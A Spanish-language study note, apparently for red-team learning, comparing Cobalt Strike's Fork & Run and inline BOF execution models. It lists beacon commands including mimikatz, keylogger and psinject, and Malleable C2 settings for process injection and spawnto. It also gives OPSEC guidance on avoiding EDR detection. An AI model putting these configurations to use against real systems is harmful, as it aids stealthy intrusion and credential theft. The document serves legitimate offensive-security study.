---
tags: [c2, cobalt-strike, fork-run, bof, opsec]
status: done
---

# Fork & Run vs BOF (Inline)

> Dos modelos de ejecución de comandos en Cobalt Strike con implicaciones OPSEC muy diferentes.

---

## Fork & Run

CS crea un proceso hijo temporal (el `spawnto`), inyecta el shellcode ahí, ejecuta, obtiene el output, y mata el proceso.

**Comandos Fork & Run:**
```
beacon> execute-assembly <assembly.exe> [args]   # .NET assembly
beacon> powerpick <command>                       # PowerShell sin powershell.exe
beacon> psinject <pid> <arch> <command>          # PS en proceso existente
beacon> portscan <targets> <ports> <discovery>   # Port scan
beacon> keylogger                                 # Keylogger en proceso hijo
beacon> screenshot                                # Screenshot
beacon> mimikatz <command>                        # Mimikatz
```

**OPSEC implicaciones:**
- Crea un proceso hijo visible (spawnto → dllhost.exe por defecto)
- El proceso hijo tiene vida corta y comportamiento anómalo
- Si se detecta/mata el hijo → el beacon sigue vivo

**Configuración del proceso hijo:**
```
# En perfil Malleable C2
post-ex {
    set spawnto_x64 "%windir%\\sysnative\\dllhost.exe";
    set spawnto_x86 "%windir%\\syswow64\\dllhost.exe";
    
    # Bloqueo de process inject (cómo se inyecta en el hijo)
    set thread_hint "ntdll.dll!RtlUserThreadStart";
    
    # Técnica de ejecución en el proceso hijo
    set startrwx "false";
    set userwx "false";
}
```

**process-inject block** — controla cómo CS inyecta en procesos:
```
process-inject {
    set allocator "NtMapViewOfSection";    # Técnica de alloc (más sigilosa que VirtualAllocEx)
    
    set startrwx "false";
    set userwx "false";
    
    transform-x64 {
        prepend "\x90\x90\x90\x90";       # NOPs antes del shellcode
    }
    
    execute {
        CreateThread "ntdll.dll!RtlUserThreadStart";   # Thread hint para creación de hilo
        NtQueueApcThread;
        CreateRemoteThread;
        RtlCreateUserThread;
    }
}
```

---

## Inline / BOF (Beacon Object Files)

El código se ejecuta **directamente en el proceso del beacon**. Sin proceso hijo.

**Comandos BOF (inline):**
```
beacon> run <command>              # Ejecutar comando directamente
beacon> shell <command>            # Shell command
beacon> powershell <command>       # PowerShell (con powershell.exe)
beacon> ls, cd, pwd, ps, etc.     # Comandos nativos del beacon
beacon> net <...>                  # Net commands via BOF
beacon> reg <...>                  # Registry via BOF
```

**Características BOF:**
- Se compila como position-independent code (PIC)
- Se inyecta en el beacon actual (mismo proceso)
- Más sigiloso pero si crashea → puede matar el beacon
- Usa API de CS para output: `BeaconPrintf`, `BeaconOutput`

**Configuración BOF en Malleable C2:**
```
stage {
    set bof_allocator "HeapAlloc";    # Cómo se aloca el BOF en memoria
    set bof_reuse_memory "false";     # Liberar memoria del BOF tras ejecución
}
```

---

## Cuándo Usar Cada Uno

| Situación | Recomendado |
|-----------|-------------|
| Operación de larga duración, alto riesgo de crash | Fork & Run |
| Enum rápida, OPSEC crítico | BOF (inline) |
| Mimikatz / herramientas agresivas | Fork & Run (si crashea no mata el beacon) |
| Comandos simples del sistema | Inline |
| Entorno con EDR que detecta fork & run | BOF |

